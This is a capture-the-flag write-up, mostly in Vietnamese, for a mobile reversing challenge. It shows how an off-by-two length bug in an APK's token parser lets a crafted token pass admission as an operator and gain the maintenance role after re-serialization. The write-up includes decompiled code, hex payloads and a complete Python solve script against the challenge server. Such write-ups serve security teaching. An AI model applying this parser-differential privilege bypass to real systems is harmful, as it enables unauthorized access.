---
title: "Field Console"
category: "Mobile"
tags: ["Reverse", "token-parsing"]
solve_date: "2026-10-11T10:12:00+07:00"
language: "vi"
---

# Field Console

**Flag:** `isfcr{f13ld_c0ns0l3_t0k3n_b1nd1ng_byp4ss}`  
**Artifact:** `field-console.apk` (21,167 bytes), service `nc 0.cloud.chals.io 25228`
| Artifact | SHA-256 |
|---|---|
| `field-console.apk` | `63ad1006a07fe55b7d6e161504f9f879c6083f8848b5465448916319af39fd5e` |

## Đề bài

APK Field Console gửi operator token tới dispatch node. Mục tiêu là đi vào maintenance path của node và lấy flag, dù ứng dụng không cho handset gửi maintenance token.

## Phân tích

APK có năm lớp. Token bắt đầu bằng magic `OSX1`, sau đó là TLV: `i32` (0x11), `blob` (0x22), `acl` (0x33), `str` (0x44), `cap` (0x55). Node gửi challenge 32-bit trong banner. Capability maintenance được tính bằng `rotateLeft(chal ^ 0x4F535831, 7)`.

Operator token mang `acl(1)`. Maintenance token mang capability và `acl(7)`, nhưng bị từ chối ở admission. Các thông báo lỗi cho thấy có bước parse, normalize, kiểm tra integrity, admission rồi dispatch.

## Các hướng đã kiểm tra

Gửi trực tiếp maintenance token bị admission từ chối. Thêm capability nhưng giữ role 1 vẫn thiếu quyền ở dispatch. Đổi tên user không thay đổi kết quả. Lặp `acl` hoặc thêm byte cuối token không tạo được hai cách nhìn phù hợp; bọc toàn bộ maintenance token trong blob bị phát hiện role drift. Các đối chứng này giới hạn cách khai thác vào bất đối xứng parse/serialize của blob.

## Lời giải

1. `Osx.parse` đọc declared length `L` nhưng chỉ lấy `L-2` byte body. `serialize` ghi lại đúng độ dài body đã lưu. Mỗi vòng reparcel làm hai byte rời khỏi vùng blob để được đọc như field tiếp theo.
2. Đặt body `acl(7) || acl(1)` gồm 4 byte trong blob khai báo dài 6. Sau blob là capability hợp lệ, tên operator và `acl(1)` ở cuối.
3. Lần parse đầu chỉ nhìn thấy role 1 ở top-level, nên admission chấp nhận. Sau normalize, cặp `33 01` được đưa ra ngoài blob, giữ top-level role 1; `33 07` còn trong body blob và tác động tới maintenance path của dispatch.
4. Body `00 00 33 07` lại đưa role 7 ra top-level, nên bị role-drift check từ chối. Thứ tự field cũng có ảnh hưởng: blob cần nằm trước các field operator.
5. Bỏ capability khỏi payload phù hợp làm node báo thiếu maintenance capability. Đây là đối chứng cho thấy payload đã tới maintenance path. Dùng capability tính từ từng banner, ba kết nối độc lập đều trả flag trong dòng `GRANT`.

Điều kiện drift chính xác nằm phía server. Mô hình trên dựa vào parser trong APK và các phản hồi quan sát được, không khẳng định đã khôi phục toàn bộ implementation của node.

   ```text
   magic + parse   ->  "malformed token"
   challenge       ->  "token not bound to this challenge"     (first i32 must equal banner)
   normalization   ->  "did not survive normalization" / "role drift"
   admission       ->  "requires a provisioned operator token" (first acl must be 1)
   dispatch        ->  "insufficient privilege" / "maintenance capability missing or invalid"
   ```

   ```java
   int iRi = ri(bArr, i2);   // declared length L
   if (iRi < 0 || iRi > MAX_LEN) throw new OsxException("blob len range");
   int i5 = iRi - 2;         // <-- off-by-two: body is L-2, not L
   if (i5 < 0 || i5 > bArr.length - i4) throw new OsxException("blob body oob");
   int i6 = i5 + i4;
   arrayList.add(Field.blob(Arrays.copyOfRange(bArr, i4, i6)));
   i = i6;
   ```

   ```text
   4f535831                    magic "OSX1"
   11 <challenge>              i32 : binds to this session's banner
   22 00000006 33073301        blob: declared 6, only 4 body bytes (acl(7) acl(1))
   55 capabilityFor(challenge) cap  : valid maintenance capability
   44 00000008 "operator"      str
   33 01                       acl(1)
   ```

   ```text
   4f5358311182f3e55322000000063307330155d05eb16644000000086f70657261746f723301
   ```

   ```text
   pass 1 (what admission reads)
     i32 0x82f3e553 | blob 33073301 | cap 0xd05eb166 | str "operator" | acl 1
     top-level acl  -> 1      => "provisioned operator token", accepted

   after serialize():  blob field re-emits as 22 00000004 33073301  (length 6 -> 4)
   pass 2 (what dispatch reads)
     i32 0x82f3e553 | blob 3307 | acl 1 | cap 0xd05eb166 | str "operator" | acl 1
     top-level acl  -> still 1  => no role drift, integrity checks stay quiet
     blob body      -> 3307     => a self-contained acl(7) field, i.e. the maintenance role
   ```

   ```text
   v1  blob body 00003307 | str, acl(1), cap          -> role drift detected during normalization
   v2  blob body 00003307 | cap, str, acl(1)          -> role drift detected during normalization
   v3  blob body 00003307 | str, acl(1), cap, acl(1)  -> role drift detected during normalization
   v4  blob body 33073301 | cap, str, acl(1)          -> GRANT isfcr{...}
   ```

   ```text
   banner='OSX dispatch node. challenge=82f3e553'
   payload=4f5358311182f3e55322000000063307330155d05eb16644000000086f70657261746f723301
   -> GRANT isfcr{f13ld_c0ns0l3_t0k3n_b1nd1ng_byp4ss}

   banner='OSX dispatch node. challenge=0dda96d0'
   payload=4f535831110dda96d02200000006330733015544e770a144000000086f70657261746f723301
   -> GRANT isfcr{f13ld_c0ns0l3_t0k3n_b1nd1ng_byp4ss}

   banner='OSX dispatch node. challenge=2bf83bec'   (run of solve_field_console.py, section below)
   payload=4f535831112bf83bec2200000006330733015555b1eeb244000000086f70657261746f723301
   -> GRANT isfcr{f13ld_c0ns0l3_t0k3n_b1nd1ng_byp4ss}
   no-cap control     -> DENY dispatch: maintenance capability missing or invalid
   operator control   -> DENY dispatch: insufficient privilege at dispatch
   ```

## Kết quả

Node trả flag trong dòng `GRANT` ở ba kết nối có challenge khác nhau. Đây là phản hồi trực tiếp của challenge service.

`isfcr{f13ld_c0ns0l3_t0k3n_b1nd1ng_byp4ss}`

## Tái hiện

Dùng Python 3 standard library; node phải còn truy cập được. Có thể dùng `jadx -d out field-console.apk` để kiểm tra parser. Lưu Python block dưới đây thành `solve_field_console.py`, rồi chạy các lệnh tiếp theo. Output gồm đối chứng tính capability và phản hồi node; operator token không capability và payload hợp lệ có capability phải cho kết quả khác nhau.

```python
import socket

MAGIC = 0x4F535831  # "OSX1"


def i32(v):
    return (v & 0xFFFFFFFF).to_bytes(4, "big")


def capability_for(chal):
    v = (chal ^ MAGIC) & 0xFFFFFFFF
    return ((v << 7) | (v >> 25)) & 0xFFFFFFFF  # Integer.rotateLeft(v, 7)


def token(chal):
    return (i32(MAGIC)
            + b"\x11" + i32(chal)                     # i32: session binding
            + b"\x22" + i32(6) + b"\x33\x07\x33\x01"  # blob: declared 6, body 4 bytes
            + b"\x55" + i32(capability_for(chal))     # cap: maintenance capability
            + b"\x44" + i32(8) + b"operator"          # str
            + b"\x33\x01")                            # acl(1)


print("check cap(82f3e553) =", hex(capability_for(0x82f3e553)))
print("check cap(0dda96d0) =", hex(capability_for(0x0dda96d0)))

s = socket.create_connection(("0.cloud.chals.io", 25228), timeout=15)
banner = s.recv(4096).decode().strip()
print("banner:", banner)
chal = int(banner.split("challenge=")[1].split()[0], 16)
payload = token(chal)
print("payload:", payload.hex())
s.sendall(payload.hex().encode() + b"\n")
print("response:", s.recv(4096).decode().strip())
s.close()

# negative control: drop the cap field
s = socket.create_connection(("0.cloud.chals.io", 25228), timeout=15)
banner = s.recv(4096).decode().strip()
chal = int(banner.split("challenge=")[1].split()[0], 16)
nocap = (i32(MAGIC) + b"\x11" + i32(chal)
         + b"\x22" + i32(6) + b"\x33\x07\x33\x01"
         + b"\x44" + i32(8) + b"operator" + b"\x33\x01")
s.sendall(nocap.hex().encode() + b"\n")
print("no-cap control:", s.recv(4096).decode().strip())
s.close()

# negative control: honest operator token
s = socket.create_connection(("0.cloud.chals.io", 25228), timeout=15)
banner = s.recv(4096).decode().strip()
chal = int(banner.split("challenge=")[1].split()[0], 16)
op = i32(MAGIC) + b"\x11" + i32(chal) + b"\x44" + i32(8) + b"operator" + b"\x33\x01"
s.sendall(op.hex().encode() + b"\n")
print("operator control:", s.recv(4096).decode().strip())
s.close()
```

```powershell
python solve_field_console.py
```

```text
check cap(82f3e553) = 0xd05eb166
check cap(0dda96d0) = 0x44e770a1
banner: OSX dispatch node. challenge=2bf83bec
payload: 4f535831112bf83bec2200000006330733015555b1eeb244000000086f70657261746f723301
response: GRANT isfcr{f13ld_c0ns0l3_t0k3n_b1nd1ng_byp4ss}
no-cap control: DENY dispatch: maintenance capability missing or invalid
operator control: DENY dispatch: insufficient privilege at dispatch
```
